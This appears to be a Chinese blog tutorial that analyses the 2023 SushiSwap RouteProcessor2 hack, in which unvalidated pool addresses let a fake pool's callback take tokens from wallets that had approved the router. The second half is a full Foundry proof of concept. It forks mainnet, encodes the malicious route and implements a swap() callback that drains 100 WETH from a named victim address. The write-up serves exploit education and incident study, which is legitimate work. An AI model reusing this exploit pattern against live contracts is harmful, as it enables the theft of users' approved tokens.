<!--StartFragment-->

为了看的清晰，本文先分析整个事件的攻击原理和流程，然后再去写POC。

# 一. Sushiswap的背景知识

Sushiswap的原理就不细说了，当初完全fork的uniswapV2，抢走了大量的uniswap用户。后来uniswap推出了V3版本，Sushiswap也推出了**自己的**V3的思想。当然了，Sushiswap一直都有自己的创新，这也是它能立足defi的原因。本次攻击的IRouteProcessor2就是一个小创新。



# 二. 攻击原理

## 正常流程：



![5dex_suhiswapV3_3_normalrouter.png](https://img.learnblockchain.cn/attachments/2023/12/6BKxgkmQ656dca07a26c7.png)


上图是正常的流程，但是攻击者往往选择的都是不普通的路。漏洞就在`打包信息`。用户指定具体的pair，sushiSwap 本应该验证用户输入，即这个pair是自己的交易对。但是，sushiSwap没有验证，导致用户可以给出`fake pool`。


## 攻击者的交易流程：


![5dex_suhiswapV3_4_bugrouter.png](https://img.learnblockchain.cn/attachments/2023/12/Y9BvQLpa656dca164e4f0.png)

最终，RouterProcessor2（实现了swapCallback接口），白白给张三转了钱。

## 谁在买单：
bug是sushiwap的，我们已经确定了。问题是这个钱是谁损失的？土豪周公子是谁？
看下面的代码，买单的人是`uniswapV3SwapCallback`的第三个参数 `data`决定的。
`uniswapV3SwapCallback`正常由 `pool` 调用，这里由`攻击合约`调用。

![5dex_suhiswapV3_9_poc4_whoispayer.png](https://img.learnblockchain.cn/attachments/2023/12/mSAC5o8p656dca664fa5b.png)

只要这个 `from` 曾经给`RouteProcessor2`授权过，就可以从 `from`那白白讲钱划走。

具体这个人是谁？不知道，只能说他是一个曾经给`RouteProcessor2`无限授权的倒霉蛋：
https://etherscan.io/address/0x31d3243cfb54b34fc9c73e1cb1137124bd6b13e1


# 三. POC

<!--StartFragment-->

## 准备工作

### 最佳学习资料：[DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)

[SunWeb3Sec: 3. 自己动手写POC1 (Price Oracle Manipulation)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03\_write_your_own_poc)\
[SunWeb3Sec: 4. 自己动手写POC2 - MEV Bot](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04\_write_your_own_poc/)\
[SunWeb3Sec: 6. 自己动手写POC3 (Reentrancy)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06\_write_your_own_poc/)

工程里有大量POC代码，非常推荐！！！

<!--EndFragment-->

### Route变量解析

先看下
https://explorer.phalcon.xyz/tx/eth/0x3610d3e3f2381c73f4bd128df9be90de87482802f30712dd555619b8bf3462a4


![5dex_suhiswapV3_5_poc1.png](https://img.learnblockchain.cn/attachments/2023/12/SrQUEgCm656da3bb13e13.png)

攻击流程简单的令人发指，攻击者加上授权就写了三行代码，就抢走了100个ETH。

流程虽然简单，但是 IRouteProcessor2 的data数据由哪些信息打包，需要提前了解下。


进入phaIcon的debug页面：
https://explorer.phalcon.xyz/tx/eth/0x3610d3e3f2381c73f4bd128df9be90de87482802f30712dd555619b8bf3462a4?line=3&debugLine=3

看看proccessRoute方法的具体入参数：
![5dex_suhiswapV3_6_poc2_paraminfo.png](https://img.learnblockchain.cn/attachments/2023/12/jbdMTLAU656da48a0069f.png)


其余参数直接拷贝即可，关键下面的`route`具体是什么鬼？

```solidity
0x01514910771af9ca656af840dff83e8264ecf986ca01000001affc8c3cd3ecf8839d4731a2335f868733f9ec90000000000000000000000000000000000000000000
```
Route由八个变量构成。

![5dex_suhiswapV3_7_poc3_routeinfo.png](https://img.learnblockchain.cn/attachments/2023/12/CNaNPjYz656dbf326ba83.png)

Route值分解成八个变量为：

![5dex_suhiswapV3_8_poc3_routeinfo2.png](https://img.learnblockchain.cn/attachments/2023/12/vOAE6dpJ656dbf66a369a.png)

值都知道了，下面就可以写代码了：


## 具体写POC

### POC准备信息

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 100 WETH.
// Attacker : https://etherscan.io/address/0xcff8bdf57f4e62c1d4f82420b8a1cad70d5bf383
// Attack Contract : https://etherscan.io/address/0xaffc8c3cd3ecf8839d4731a2335f868733f9ec90
// Vulnerable Contract : https://etherscan.io/address/0x044b75f554b886a065b9567891e45c79542d7357
// Attack Tx : https://etherscan.io/tx/0x3610d3e3f2381c73f4bd128df9be90de87482802f30712dd555619b8bf3462a4

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x044b75f554b886a065b9567891e45c79542d7357#code

// @Analysis
// Twitter Guy :https://twitter.com/BlockSecTeam/status/1644977808450396160
// https://explorer.phalcon.xyz/tx/eth/0x3610d3e3f2381c73f4bd128df9be90de87482802f30712dd555619b8bf3462a4

contract ContractTest is Test{

}

```
### 接口信息

```solidity
interface RouteProcessor2{
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}
contract ContractTest is Test{
    RouteProcessor2 routeProcessor2 = RouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    address PAYER = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;

    function setUp() public  {
        vm.createSelectFork('mainnet', 17007839 - 1);
    }
  }
```
### step1 调用RouteProcessor2
```solidity
    function testExploit() public {
        WETH.approve(address(routeProcessor2), type(uint256).max);
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route = abi.encodePacked(commandCode, address(LINK), num, share, poolType, pool, zeroForOne, recipient);

        routeProcessor2.processRoute(
            0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,
            0,
            0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,
            0,
            0x0000000000000000000000000000000000000000,
            route
        );
    }
```
### step2 在回调的swap(...)中指定受害人地址
```solidity
//被 RouteProcessor2 回调
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1){
        amount0 = 0;
        amount1 = 0;
        //第二个参数指定付款地址
        bytes memory data2 = abi.encode(address(WETH), PAYER);
        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback( 100e18, amount1, data2 );
    }
```

### 最终

![image.png](https://img.learnblockchain.cn/attachments/2023/12/WdW1R2UT656dd31206aa3.png)
结果，土豪 `0x31d3243cfb54b34fc9c73e1cb1137124bd6b13e1` 热情的替SushiSwap买了单。


<!--EndFragment-->


<!--StartFragment-->

<!--EndFragment-->